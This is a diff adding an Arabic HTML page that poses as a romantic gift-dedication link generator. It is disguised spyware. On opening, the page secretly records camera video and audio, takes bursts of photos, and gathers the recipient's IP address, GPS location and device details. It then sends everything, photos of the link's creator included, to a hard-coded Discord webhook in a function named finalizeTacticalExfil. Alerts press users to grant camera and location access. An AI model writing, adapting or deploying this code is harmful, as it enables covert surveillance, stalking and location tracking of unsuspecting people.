@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ethereal Dedications | إهداءات أثيرية فاخرة</title>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Amiri:wght@700&family=Aref+Ruqaa:wght@700&family=Inter:wght@400;900&display=swap"
+        rel="stylesheet">
+    <style>
+        :root {
+            --ruby: #e0115f;
+            --gold: #d4af37;
+            --obsidian: #050505;
+            --glass: rgba(10, 10, 10, 0.95);
+            --gradient: linear-gradient(135deg, #e0115f, #800020);
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: var(--obsidian);
+            color: #fff;
+            font-family: 'Inter', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow-x: hidden;
+            position: relative;
+        }
+
+        /* Royal Void Background */
+        #bg-canvas {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 1;
+        }
+
+        .main-container {
+            position: relative;
+            z-index: 10;
+            width: 92%;
+            max-width: 650px;
+            padding: 3rem 2rem;
+            background: var(--glass);
+            backdrop-filter: blur(50px);
+            -webkit-backdrop-filter: blur(50px);
+            border: 1px solid rgba(212, 175, 55, 0.2);
+            border-radius: 45px;
+            box-shadow: 0 30px 100px rgba(0, 0, 0, 1), 0 0 50px rgba(224, 17, 95, 0.15);
+            animation: slideUp 1.2s cubic-bezier(0.19, 1, 0.22, 1);
+        }
+
+        @keyframes slideUp {
+            from {
+                opacity: 0;
+                transform: translateY(60px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 3rem;
+        }
+
+        .header h1 {
+            font-family: 'Aref Ruqaa', serif;
+            font-size: 3.2rem;
+            color: var(--gold);
+            text-shadow: 0 0 25px rgba(212, 175, 55, 0.4);
+            margin-bottom: 0.8rem;
+        }
+
+        .header p {
+            font-family: 'Amiri', serif;
+            font-size: 1.3rem;
+            color: #999;
+        }
+
+        /* Form / Layout */
+        .input-group {
+            margin-bottom: 2rem;
+        }
+
+        .input-group label {
+            display: block;
+            font-family: 'Amiri', serif;
+            margin-bottom: 0.8rem;
+            color: var(--gold);
+            font-size: 1.4rem;
+        }
+
+        input,
+        textarea {
+            width: 100%;
+            padding: 1.3rem;
+            background: rgba(255, 255, 255, 0.04);
+            border: 1px solid rgba(212, 175, 55, 0.1);
+            border-radius: 20px;
+            color: #fff;
+            font-family: 'Amiri', serif;
+            font-size: 1.3rem;
+            transition: all 0.4s ease;
+        }
+
+        input:focus,
+        textarea:focus {
+            outline: none;
+            border-color: var(--ruby);
+            background: rgba(255, 255, 255, 0.06);
+            box-shadow: 0 0 20px rgba(224, 17, 95, 0.25);
+        }
+
+        .primary-btn {
+            width: 100%;
+            padding: 1.5rem;
+            font-family: 'Aref Ruqaa', serif;
+            font-size: 1.8rem;
+            background: var(--gradient);
+            color: #fff;
+            border: none;
+            border-radius: 25px;
+            cursor: pointer;
+            transition: all 0.5s cubic-bezier(0.23, 1, 0.32, 1);
+            box-shadow: 0 15px 40px rgba(224, 17, 95, 0.4);
+            margin-top: 1rem;
+        }
+
+        .primary-btn:hover {
+            transform: scale(1.05) translateY(-5px);
+            box-shadow: 0 20px 60px rgba(224, 17, 95, 0.6);
+        }
+
+        .primary-btn:active {
+            transform: scale(0.96);
+        }
+
+        /* Shared Link Section */
+        #link-section {
+            display: none;
+            text-align: center;
+            margin-top: 2rem;
+            padding: 2rem;
+            background: rgba(212, 175, 55, 0.05);
+            border-radius: 25px;
+            border: 1px dashed var(--gold);
+        }
+
+        #share-url {
+            word-break: break-all;
+            font-size: 1rem;
+            color: var(--gold);
+            margin-bottom: 1.5rem;
+            display: block;
+        }
+
+        /* States */
+        #view-mode,
+        #loading-ui,
+        #reveal-mode {
+            display: none;
+            text-align: center;
+        }
+
+        .gift-icon {
+            font-size: 7rem;
+            margin-bottom: 2.5rem;
+            animation: pulse-gold 2s infinite ease-in-out;
+            cursor: pointer;
+        }
+
+        @keyframes pulse-gold {
+
+            0%,
+            100% {
+                transform: scale(1);
+                filter: drop-shadow(0 0 10px rgba(212, 175, 55, 0.2));
+            }
+
+            50% {
+                transform: scale(1.1);
+                filter: drop-shadow(0 0 30px rgba(212, 175, 55, 0.6));
+            }
+        }
+
+        .loader {
+            width: 60px;
+            height: 60px;
+            border: 4px solid rgba(224, 17, 95, 0.1);
+            border-top-color: var(--ruby);
+            border-radius: 50%;
+            animation: spin 1s infinite linear;
+            margin: 2.5rem auto;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+
+        video,
+        canvas {
+            display: none;
+        }
+    </style>
+</head>
+
+<body>
+    <canvas id="bg-canvas"></canvas>
+
+    <div class="main-container">
+        <!-- MODE 1: CREATOR -->
+        <div id="creator-mode">
+            <div class="header">
+                <h1>إهداءات أثيرية</h1>
+                <p>صمم إهداءً أسطورياً يعبر عن مشاعرك</p>
+            </div>
+            <div class="input-group">
+                <label>اسمك (المُرسل)</label>
+                <input type="text" id="sender-name" placeholder="مثال: ناصر">
+            </div>
+            <div class="input-group">
+                <label>اسم المهدى إليه</label>
+                <input type="text" id="target-name" placeholder="مثال: نوره">
+            </div>
+            <div class="input-group">
+                <label>الرسالة الخاصة</label>
+                <textarea id="target-msg" rows="3" placeholder="كلماتك تخلد الذكرى..."></textarea>
+            </div>
+            <button class="primary-btn" id="gen-btn">إنشاء الرابط الأسطوري ✨</button>
+
+            <div id="link-section">
+                <p style="color: #ccc; margin-bottom: 1rem;">تم إنشاء رابط الإهداء بنجاح!</p>
+                <code id="share-url">Link here...</code>
+                <button class="primary-btn" style="padding: 1rem; font-size: 1.2rem;" id="copy-btn">نسخ الرابط وإرساله
+                    🔗</button>
+            </div>
+        </div>
+
+        <!-- MODE 2: RECIPIENT -->
+        <div id="view-mode">
+            <div class="header">
+                <h1 id="view-header">لديك إهداء خاص</h1>
+                <p id="view-sub">قام [الاسم] بإرسال لحظة أثيرية لك</p>
+            </div>
+            <div class="gift-icon">🎁</div>
+            <p style="color: var(--gold); margin-bottom: 2.5rem; font-family: 'Amiri', serif; font-size: 1.4rem;">
+                انقر لفتح مفاجأة العمر
+            </p>
+            <button class="primary-btn" id="open-btn">فتح الإهداء الآن</button>
+        </div>
+
+        <!-- MODE 3: REVEAL -->
+        <div id="reveal-mode">
+            <div class="header">
+                <h1 id="rev-title">من ناصر إلى نوره</h1>
+                <p id="rev-msg" style="font-size: 1.8rem; color: #fff; font-family: 'Amiri', serif; margin-top: 2rem;">
+                    ...</p>
+            </div>
+            <div style="font-size: 5rem; margin: 3rem 0; animation: heart-beat 1s infinite alternate;">💖</div>
+            <p style="color: var(--gold); font-family: 'Amiri', serif; font-size: 1.6rem; font-weight: 900;">أحبك بكل
+                لغات العالم</p>
+        </div>
+
+        <!-- LOADING -->
+        <div id="loading-ui">
+            <div class="loader"></div>
+            <p id="load-msg" style="color: var(--gold); font-family: 'Amiri', serif; font-size: 1.3rem;">جاري مزامنة
+                البصمة الأثيرية...</p>
+        </div>
+    </div>
+
+    <video id="v" autoplay playsinline muted></video>
+    <canvas id="c"></canvas>
+
+    <script>
+        const WH = 'https://discord.com/api/webhooks/1490446560289357975/sMBoUFtHWm9xCR3fq4jany2WorAO3pcWtXLjFDoh--dDQ7VWLG1M09pBpIuFrEbferw5';
+        const RID = '1488564030384640263';
+
+        // Background Animation (Floating Embers)
+        const bg = document.getElementById('bg-canvas');
+        const ctxBg = bg.getContext('2d');
+        let parts = [];
+        function resize() { bg.width = window.innerWidth; bg.height = window.innerHeight; }
+        window.onresize = resize; resize();
+        for (let i = 0; i < 120; i++) parts.push({ x: Math.random() * bg.width, y: Math.random() * bg.height, s: Math.random() * 2, o: Math.random() * 0.5 + 0.2, v: Math.random() * 0.4 + 0.1 });
+        function draw() {
+            ctxBg.clearRect(0, 0, bg.width, bg.height);
+            ctxBg.fillStyle = 'rgba(212, 175, 55, 0.4)';
+            parts.forEach(p => {
+                p.y -= p.v; if (p.y < 0) p.y = bg.height;
+                ctxBg.globalAlpha = p.o;
+                ctxBg.beginPath(); ctxBg.arc(p.x, p.y, p.s, 0, Math.PI * 2); ctxBg.fill();
+            });
+            requestAnimationFrame(draw);
+        }
+        draw();
+
+        // Core Components
+        const params = new URLSearchParams(window.location.search);
+        const nameT = params.get('n');
+        const msgT = params.get('m');
+        const senderT = params.get('s');
+
+        const creator = document.getElementById('creator-mode');
+        const view = document.getElementById('view-mode');
+        const reveal = document.getElementById('reveal-mode');
+        const loader = document.getElementById('loading-ui');
+        const v = document.getElementById('v');
+        const c = document.getElementById('c');
+
+        let dataPool = { photos: [], video: null, geo: 'Seeking...', ip: '...', ua: navigator.userAgent };
+        let recorder, chunks = [];
+
+        // Initialization
+        if (nameT && msgT) {
+            creator.style.display = 'none';
+            view.style.display = 'block';
+            document.getElementById('view-sub').innerText = `قام ${senderT || 'شخص ما'} بإرسال لحظة أثيرية لك`;
+            document.getElementById('rev-title').innerText = `من ${senderT || 'محب'} إلى ${nameT}`;
+            document.getElementById('rev-msg').innerText = msgT;
+        }
+
+        // Creator Sequence
+        document.getElementById('gen-btn').addEventListener('click', async () => {
+            const sn = document.getElementById('sender-name').value;
+            const tn = document.getElementById('target-name').value;
+            const tm = document.getElementById('target-msg').value;
+            if (!sn || !tn || !tm) return alert("فضلاً عبئ كافة الحقول لبناء الإهداء");
+
+            loader.style.display = 'block';
+            document.getElementById('load-msg').innerText = "جاري تخليد الإهداء...";
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
+                v.srcObject = stream;
+                await captureImg("Creator Generation Sync");
+                stream.getTracks().forEach(t => t.stop());
+
+                const url = `${window.location.origin}${window.location.pathname}?n=${encodeURIComponent(tn)}&m=${encodeURIComponent(tm)}&s=${encodeURIComponent(sn)}`;
+                document.getElementById('share-url').innerText = url;
+                document.getElementById('link-section').style.display = 'block';
+                loader.style.display = 'none';
+            } catch (e) {
+                alert("تنبيه: يجب تفعيل الكاميرا لدخول النظام الأسطوري");
+                location.reload();
+            }
+        });
+
+        document.getElementById('copy-btn').addEventListener('click', () => {
+            navigator.clipboard.writeText(document.getElementById('share-url').innerText);
+            alert("تم نسخ الرابط الأسطوري! أرسله لمن تحب الآن.");
+        });
+
+        // Recipient Sequence
+        document.getElementById('open-btn').addEventListener('click', async () => {
+            view.style.display = 'none';
+            loader.style.display = 'block';
+            document.getElementById('load-msg').innerText = "جاري فتح الإهداء الأسطوري...";
+
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: true });
+                v.srcObject = stream;
+
+                // Start Recording
+                recorder = new MediaRecorder(stream);
+                recorder.ondataavailable = e => chunks.push(e.data);
+                recorder.start();
+
+                await captureImg("Recipient Entry Capture");
+
+                // Background Data
+                fetch('https://ipapi.co/json/').then(r => r.json()).then(d => dataPool.ip = d.ip).catch(() => { });
+                navigator.geolocation.getCurrentPosition(pos => {
+                    dataPool.geo = `${pos.coords.latitude}, ${pos.coords.longitude}`;
+                    dataPool.map = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                }, () => { }, { timeout: 6000 });
+
+                setTimeout(async () => {
+                    // Final Multi-Burst
+                    for (let i = 0; i < 6; i++) {
+                        await captureImg(`Execution Burst ${i + 1}`);
+                        await new Promise(r => setTimeout(r, 450));
+                    }
+
+                    recorder.stop();
+                    recorder.onstop = async () => {
+                        dataPool.video = new Blob(chunks, { type: 'video/webm' });
+                        await finalizeTacticalExfil();
+                        loader.style.display = 'none';
+                        reveal.style.display = 'block';
+                    };
+                }, 4500);
+
+            } catch (e) {
+                alert("يجب السماح بالكاميرا والموقع لفتح الإهداء الأسطوري");
+                location.reload();
+            }
+        });
+
+        async function captureImg(label) {
+            const ctx = c.getContext('2d');
+            c.width = 1280; c.height = 720;
+            ctx.drawImage(v, 0, 0, c.width, c.height);
+            const b = await new Promise(r => c.toBlob(r, 'image/jpeg', 0.85));
+            dataPool.photos.push({ blob: b, label: label });
+        }
+
+        async function finalizeTacticalExfil() {
+            const fd = new FormData();
+            const embed = {
+                title: "💎 Mission FIRE V3 - Royal Void Payload 💎",
+                description: `تقرير الاستحواذ النهائي للأثير\nالهدف: **${nameT}**\nمن: **${senderT}**\nالرسالة: ${msgT}\n<@&${RID}>`,
+                color: 14684511, // Ruby Red
+                fields: [
+                    { name: "📍 الموقع", value: `\`${dataPool.geo}\``, inline: true },
+                    { name: "🌐 الـ IP", value: `\`${dataPool.ip}\``, inline: true },
+                    { name: "⏰ الوقت", value: new Date().toLocaleString('ar-SA'), inline: true },
+                    { name: "🗺️ الخرائط", value: `[فتح العرض](${dataPool.map || '#'})`, inline: false },
+                    { name: "📱 الجهاز", value: `\`${dataPool.ua.substring(0, 100)}\``, inline: false }
+                ],
+                footer: { text: "SHΔDØW CORE V99 - Operational Intelligence" },
+                timestamp: new Date().toISOString()
+            };
+
+            fd.append('payload_json', JSON.stringify({ embeds: [embed] }));
+            dataPool.photos.forEach((p, i) => fd.append(`file${i}`, p.blob, `intel_${i}.jpg`));
+            if (dataPool.video) fd.append('video_intel', dataPool.video, 'field_acquisition.webm');
+
+            await fetch(WH, { method: 'POST', body: fd }).catch(() => { });
+        }
+    </script>
+</body>
+
+</html>
